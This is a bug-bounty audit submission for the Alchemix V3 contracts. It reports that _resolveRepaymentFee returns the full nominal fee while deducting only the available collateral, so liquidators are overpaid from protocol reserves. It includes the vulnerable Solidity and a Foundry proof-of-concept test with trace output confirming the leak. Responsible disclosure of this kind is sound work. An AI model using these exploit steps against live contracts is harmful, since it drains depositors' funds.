# 58234 sc critical there is a problem related ot repayment fee overpayment can lead to protocol insolvency

**Submitted on Oct 31st 2025 at 16:09:38 UTC by @XDZIBECX for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58234
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

there is a problem in the`_resolveRepaymentFee()` function, this function is calculates the full repayment fee and returns that amount, and when it's deducting from the user's account, it only takes what's actually available. and If the account doesn't have enough collateral to cover the full fee, the function caps the deduction at whatever balance is remains. the problem is that the liquidators get paid the full calculated fee amount, even though the protocol only deducted the partial or zero amount from the account. and this mismatch its can causes the protocol to pay liquidators from its own reserves to make up the difference, and this is leaking funds with every undercollateralized liquidation as result this is lead to insolvency where the protocol cannot honor user withdrawals is show this issue in the poc check the test is show this issue .

## Vulnerability Details

root of the bug is the mismatch between what the fucntion is deducts from an account and what it reports as deducted. in \_resolveRepaymentFee it's deducts `min(nominal_fee, account.collateralBalance)` from the account's collateral balance, capping the deduction at available funds, butit's returns the uncapped `nominal_fee` value.When `_forceRepay()` calls this function and receives the returned fee value, it uses that amount to transfer MYT tokens to the liquidator and this is happen without realizing that less or even zero, was actually deducted from the account. and this is mmeans that whenever an account has insufficient collateral to cover the full repayment fee, the protocol pays the liquidator from its general reserves rather than from the liquidated account's collateral, and this is directly leaking protocol funds with each such liquidation and reduce the collateral backing for all user deposits here where this bug is came from ---> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L900C1-L907C6> :

```solidity
     function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        fee = repaidAmountInYield * repaymentFee / BPS;
        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee; 
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
        return fee; << here is Returns nominal fee, not actual deducted amount
    }
```

the bug is triggered during the liquidation when the fucntion `_forceRepay()` is consumes all or most of an account's collateral to repay their debt by transferring MYT to the transmuter. because after this transfer depletes the account's collateral balance to zero or near-zero, the fucntion `_resolveRepaymentFee()` is called to calculate the liquidator's fee as 10% of the repaid amount, and is attempts to deduct it from the account's collateral (which now has little or nothing left, so it deducts zero or a tiny amount), but then returns the full nominal fee amount. then the the `_forceRepay` transfers this full nominal fee to the liquidator even though little or nothing was actually deducted from the victim's account. So the difference between what was paid out and what was deducted comes directly from the protocol's general MYT reserves, and this is cause a leak that can exploite repeatedly to drain the protocol ,\
here where the liquidate() fucntion is calls the \_forceRepay --> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L819C1-L822C10> :

```solidity
if (account.earmarked > 0) {
    repaidAmountInYield = _forceRepay(accountId, account.earmarked); <<
}
```

the function `_forceRepay()` is depletes the account collateral from this line --> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L764C1-L782C6>

```solidity
        creditToYield = creditToYield > account.collateralBalance ? account.collateralBalance : creditToYield;
        account.collateralBalance -= creditToYield; << here where is  Deducts collateral 

        uint256 protocolFeeTotal = creditToYield * protocolFee / BPS;

        emit ForceRepay(accountId, amount, creditToYield, protocolFeeTotal);

        if (account.collateralBalance > protocolFeeTotal) {
            account.collateralBalance -= protocolFeeTotal; << here  Deducts MORE collateral
            // Transfer the protocol fee to the protocol fee receiver
            TokenUtils.safeTransfer(myt, protocolFeeReceiver, protocolFeeTotal);
        }

        if (creditToYield > 0) {
            // Transfer the repaid tokens from the account to the transmuter.
            TokenUtils.safeTransfer(myt, address(transmuter), creditToYield); << here where is Sends MYT out 
        }
        return

```

* so the account collateral is now 0 or very low after these deductions, the `_liquidate` is calls the `_resolveRepaymentFee` here where the bug is happen --> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L823C9-L829C1>

```
        if (account.debt == 0) {
            feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield); << the BUG HAPPENS HERE 
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield); << here is Pays nominal fee 
            return (repaidAmountInYield, feeInYield, 0);
        }
```

the same as here --> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L837C8-L842C10> the fucntion `_resolveRepaymentFee()` it's returns the nominal fee despite the insufficient collateral from here --> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L896C1-L908C1> :

```solidity
 function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        fee = repaidAmountInYield * repaymentFee / BPS;  << here where the Calculate 50e18 is how this in the poc 
        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee; << this is Deduct 0 
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
        return fee; << the bug is  Returns 50e18 even though only 0 was deducted!
    }
 

```

so when liquidating an undercollateralized account with 100e18 collateral, the `_forceRepay()` first consumes \*all 100e18 to repay the debt (sent to transmuter), ans this is leave the the account with 0 collateral. then the `_resolveRepaymentFee()` is calculates a 50e18 liquidation fee (as 50% of repaid amount), and is attempts to deduct it from the now-empty account (deducts nothing), but is returns the full 50e18 anyway, and the protocol then pays this 50e18 to the liquidator from its general MYT reserves (not from the account). so the the protocol loses 150e18 total (100e18 legitimate + 50e18 leaked) even though the account only had 100e18, and `_mytSharesDeposited` is never updated to reflect this loss. so this is can exploit repeatedly and as result this will drains the protocol reserves and causes insolvency because the protocol owes more to depositors than it actually holds.

## Impact Details

This vulnerability it's can allows attackers to steal funds from the protocol's reserves, and this can happen when an undercollateralized account gets liquidated, the protocol first takes all the account's collateral (lets say 100 tokens) to repay debt. then it calculates a liquidation fee (let's say 50 tokens at 50% fee rate) to pay the liquidator. The bug is that even though the account is already empty, the protocol still pays the liquidator the full 50 tokens from its own reserves and the money that doesn't belong to that account. The attacker can create bad positions, and liquidate them, and take this extra payment each time. the protocol's accounting doesn't track these leaked funds, it thinks it has more money than it actually does. so after this happen and many attacks, the protocol runs out of real funds while still owing users their deposits. so When users try to withdraw, there won't be enough tokens to pay them back, then the protocol becomes insolvent and cannot honor withdrawal requests. this bug is can leads to protocol insolvency and loss of all users' funds it's need to be fixed i show a scenario that confirm this check the test

## References

i use all line in the vulnerability details check them

## Proof of Concept

## Proof of Concept

here is a test show this bug, copy past this test in the contract AlchemistV3.t.sol an run forge test --match-test test\_RepaymentFee\_Overpayment\_Bug -vvvv

```solidity

 function test_RepaymentFee_Overpayment_Bug() external {
        // Setup: High repayment fee to make the bug easier to trigger
        vm.startPrank(alOwner);
        alchemist.setProtocolFee(0); // Disable protocol fee for simplicity
        alchemist.setRepaymentFee(5000); // 50% repayment fee (high to trigger bug)
        vm.stopPrank();
        
        uint256 depositAmount1 = 1000e18;
        uint256 depositAmount2 = 100e18;
        
        // Create a whale account to maintain global collateralization
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount1);
        alchemist.deposit(depositAmount1, yetAnotherExternalUser, 0);
        vm.stopPrank();
        
        // Create victim account with minimal collateral and debt
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount2);
        alchemist.deposit(depositAmount2, address(0xbeef), 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenId, 40e18, address(0xbeef)); // Mint 40e18 debt (40% LTV)
        vm.stopPrank();
        
        // Create redemption to earmark the debt
        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 40e18);
        transmuterLogic.createRedemption(40e18);
        vm.stopPrank();
        
        // Advance time to fully earmark the debt
        vm.roll(block.number + 5_256_000);
        
        // NOW: Crash the price to make collateral barely cover repayment (not the fee)
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        
        // Drop price by 98% (supply increases 50x)
        uint256 modifiedVaultSupply = initialVaultSupply * 50;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);
        
        // Check state before liquidation
        (uint256 collateralBefore, uint256 debtBefore, uint256 earmarkedBefore) = alchemist.getCDP(tokenId);
        
        console.log("=== BEFORE LIQUIDATION ===");
        console.log("Account collateral:", collateralBefore);
        console.log("Account debt:", debtBefore);
        console.log("Account earmarked debt:", earmarkedBefore);
        
        // The bug scenario: After _forceRepay consumes most collateral, 
        // remaining collateral should be < nominal repayment fee
        uint256 repaidAmountInYield = alchemist.convertDebtTokensToYield(earmarkedBefore);
        uint256 nominalRepaymentFee = repaidAmountInYield * 5000 / BPS; // 50%
        
        console.log("\n=== FEE CALCULATION ===");
        console.log("Repaid amount (yield):", repaidAmountInYield);
        console.log("Nominal repayment fee (50%):", nominalRepaymentFee);
        console.log("Collateral before repay:", collateralBefore);
        
        // Expected: After _forceRepay takes repaidAmountInYield from collateral,
        // remaining = collateralBefore - repaidAmountInYield
        // If remaining < nominalRepaymentFee, bug triggers
        
        uint256 expectedRemainingAfterForceRepay = collateralBefore > repaidAmountInYield 
            ? collateralBefore - repaidAmountInYield 
            : 0;
        
        console.log("Expected remaining after _forceRepay:", expectedRemainingAfterForceRepay);
        console.log("Will trigger bug?", nominalRepaymentFee > expectedRemainingAfterForceRepay);
        
        // Record balances before liquidation
        uint256 alchemistMytBefore = vault.balanceOf(address(alchemist));
        uint256 liquidatorMytBefore = vault.balanceOf(externalUser);
        
        // Attempt liquidation
        vm.startPrank(externalUser);
        
        // If this reverts, the account state doesn't allow liquidation
        // We'll use try/catch to handle it gracefully
        try alchemist.liquidate(tokenId) returns (uint256 assets, uint256 feeInYield, uint256 feeInUnderlying) {
            vm.stopPrank();
            
            // Check balances after liquidation
            uint256 alchemistMytAfter = vault.balanceOf(address(alchemist));
            uint256 liquidatorMytAfter = vault.balanceOf(externalUser);
            (uint256 collateralAfter,,) = alchemist.getCDP(tokenId);
            
            console.log("\n=== AFTER LIQUIDATION ===");
            console.log("Assets liquidated:", assets);
            console.log("Fee paid to liquidator:", feeInYield);
            console.log("Account collateral after:", collateralAfter);
            
            uint256 actualCollateralDeducted = collateralBefore - collateralAfter;
            uint256 liquidatorReceived = liquidatorMytAfter - liquidatorMytBefore;
            uint256 alchemistLost = alchemistMytBefore - alchemistMytAfter;
            
            console.log("\n=== VERIFICATION ===");
            console.log("Collateral deducted from account:", actualCollateralDeducted);
            console.log("Liquidator received (actual):", liquidatorReceived);
            console.log("Alchemist MYT lost:", alchemistLost);
            
            // Check if bug exists: liquidator received nominal fee even though account couldn't cover it
            uint256 actualDeductedForFee = expectedRemainingAfterForceRepay > nominalRepaymentFee 
                ? nominalRepaymentFee 
                : expectedRemainingAfterForceRepay;
            
            console.log("\n=== BUG CHECK ===");
            console.log("Actual fee deducted from account:", actualDeductedForFee);
            console.log("Fee paid to liquidator:", feeInYield);
            
            if (feeInYield > actualDeductedForFee) {
                console.log("!!! BUG CONFIRMED !!!");
                console.log("Overpayment amount:", feeInYield - actualDeductedForFee);
                console.log("This overpayment was leaked from protocol's general MYT balance");
                
                // The bug exists: liquidator was overpaid
                assertGt(feeInYield, actualDeductedForFee, "BUG CONFIRMED: Liquidator received more than account was charged");
                assertGt(feeInYield, 0, "Liquidator received non-zero fee");
                assertEq(actualDeductedForFee, 0, "Account had nothing left to pay fee");
                
                // This proves MYT was leaked from the protocol
                // Protocol lost: assets (to transmuter) + feeInYield (to liquidator) = 150e18
                // But account only had: 100e18
                // Leak: 50e18
                uint256 expectedLoss = assets + actualDeductedForFee; // What should have been lost from account
                uint256 actualLoss = alchemistLost; // What was actually lost from protocol
                assertGt(actualLoss, expectedLoss, "BUG CONFIRMED: Protocol lost more MYT than account had");
                
                console.log("\n=== PROOF OF LEAK ===");
                console.log("Protocol should have lost (from account):", expectedLoss);
                console.log("Protocol actually lost (total):", actualLoss);
                console.log("Leaked from general MYT balance:", actualLoss - expectedLoss);
                
            } else {
                console.log("NO BUG: Function behaves correctly");
                console.log("Fee was properly capped to available collateral");
                assertEq(feeInYield, actualDeductedForFee, "Fee correctly matches what was deducted");
            }
            
        } catch Error(string memory reason) {
            vm.stopPrank();
            console.log("\n=== LIQUIDATION FAILED ===");
            console.log("Reason:", reason);
            console.log("Cannot test bug - liquidation path not accessible with current parameters");
            
            // This means either:
            // 1. Account is not liquidatable (still overcollateralized)
            // 2. No earmarked debt
            // 3. Other liquidation requirements not met
            
            // Let's check why
            // Check if account is undercollateralized manually
            uint256 minimumCollateral = (debtBefore * alchemist.minimumCollateralization()) / BPS;
            bool isUndercollateralized = collateralBefore < minimumCollateral;
            console.log("Is undercollateralized?", isUndercollateralized);
            console.log("Has earmarked debt?", earmarkedBefore > 0);
            
            // Mark test as inconclusive - cannot verify bug due to liquidation revert
            assertTrue(false, "Test inconclusive: liquidation reverted, cannot verify bug");
            
        } catch (bytes memory) {
            vm.stopPrank();
            console.log("\n=== LIQUIDATION REVERTED ===");
            console.log("Liquidation reverted with custom error");
            console.log("Cannot test bug - need different setup to trigger liquidation path");
            
            // Mark test as inconclusive
            assertTrue(false, "Test inconclusive: liquidation reverted, cannot verify bug");
        }
    }
  }


```

the result are long that why i past this part of them only :

```solidity

    │   │   │   │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   │   │   │   └─ ← [Return] 20000000000000000 [2e16]
    │   │   │   │   ├─ [553] MockYieldToken::decimals() [staticcall]
    │   │   │   │   │   └─ ← [Return] 18
    │   │   │   │   └─ ← [Return] 20000000000000000000000 [2e22]
    │   │   │   └─ ← [Return] 1999999999999999999999 [1.999e21]
    │   │   ├─ [20464] MockMYTVault::convertToShares(40000000000000000000 [4e19]) [staticcall]
    │   │   │   ├─ [931] TestERC20::balanceOf(MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [9564] MockMYTStrategy::realAssets() [staticcall]
    │   │   │   │   ├─ [1051] MockYieldToken::balanceOf(MockMYTStrategy: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   │   │   ├─ [4885] MockYieldToken::price() [staticcall]
    │   │   │   │   │   ├─ [931] TestERC20::balanceOf(MockYieldToken: [0x8E8149E630eD0e6D24Ec34d667fd4351bc113CE0]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   │   │   │   └─ ← [Return] 20000000000000000 [2e16]
    │   │   │   │   ├─ [553] MockYieldToken::decimals() [staticcall]
    │   │   │   │   │   └─ ← [Return] 18
    │   │   │   │   └─ ← [Return] 20000000000000000000000 [2e22]
    │   │   │   └─ ← [Return] 1999999999999999999999 [1.999e21]
    │   │   ├─ [20464] MockMYTVault::convertToShares(40000000000000000000 [4e19]) [staticcall]
    │   │   │   ├─ [931] TestERC20::balanceOf(MockMYTVault: [0xd7D9fC89347Cc01C7707010604E99D146AC0C3BF]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [9564] MockMYTStrategy::realAssets() [staticcall]
    │   │   │   │   ├─ [1051] MockYieldToken::balanceOf(MockMYTStrategy: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   │   │   ├─ [4885] MockYieldToken::price() [staticcall]
    │   │   │   │   │   ├─ [931] TestERC20::balanceOf(MockYieldToken: [0x8E8149E630eD0e6D24Ec34d667fd4351bc113CE0]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
    │   │   │   │   │   └─ ← [Return] 20000000000000000 [2e16]
    │   │   │   │   ├─ [553] MockYieldToken::decimals() [staticcall]
    │   │   │   │   │   └─ ← [Return] 18
    │   │   │   │   └─ ← [Return] 20000000000000000000000 [2e22]
    │   │   │   └─ ← [Return] 1999999999999999999999 [1.999e21]
    │   │   ├─ emit ForceRepay(accountId: 2, amount: 40000000000000000000 [4e19], creditToYield: 100000000000000000000
 [1e20], protocolFeeTotal: 0)
    │   │   ├─ [26990] MockMYTVault::transfer(Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], 100000000000000000000 [1e20])
    │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], to: Transmuter: [0x2387b3383E89c164781d173B7Aa14d9c46eD2642], value: 100000000000000000000 [1e20])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit RepaymentFee(accountId: 2, amount: 100000000000000000000 [1e20], feeReciever: 0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420, fee: 50000000000000000000 [5e19])
    │   │   ├─ [9890] MockMYTVault::transfer(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420, 50000000000000000000 [5e19]) 
    │   │   │   ├─ emit Transfer(from: TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393], to: 0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420, value: 50000000000000000000 [5e19])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] 100000000000000000000 [1e20], 50000000000000000000 [5e19], 0
    │   └─ ← [Return] 100000000000000000000 [1e20], 50000000000000000000 [5e19], 0
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [1715] MockMYTVault::balanceOf(TransparentUpgradeableProxy: [0x48c33395391C097df9c9aA887a40f1b47948D393]) [staticcall]
    │   └─ ← [Return] 950000000000000000000 [9.5e20]
    ├─ [1715] MockMYTVault::balanceOf(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420) [staticcall]
    │   └─ ← [Return] 200050000000000000000000 [2e23]
    ├─ [12956] TransparentUpgradeableProxy::fallback(2) [staticcall]
    │   ├─ [12235] AlchemistV3::getCDP(2) [delegatecall]
    │   │   └─ ← [Return] 0, 0, 0
    │   └─ ← [Return] 0, 0, 0
    ├─ [0] console::log("\n=== AFTER LIQUIDATION ===") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Assets liquidated:", 100000000000000000000 [1e20]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Fee paid to liquidator:", 50000000000000000000 [5e19]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Account collateral after:", 0) [staticcall]
    ├─ [0] console::log("\n=== BUG CHECK ===") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Actual fee deducted from account:", 0) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Fee paid to liquidator:", 50000000000000000000 [5e19]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("!!! BUG CONFIRMED !!!") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Overpayment amount:", 50000000000000000000 [5e19]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("This overpayment was leaked from protocol's general MYT balance") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("\n=== PROOF OF LEAK ===") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Protocol should have lost (from account):", 100000000000000000000 [1e20]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Protocol actually lost (total):", 150000000000000000000 [1.5e20]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Leaked from general MYT balance:", 50000000000000000000 [5e19]) [staticcall]
    │   └─ ← [Stop]
    └─ ← [Return]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 23.41ms (4.64ms CPU time)

Ran 1 test suite in 44.52ms (23.41ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
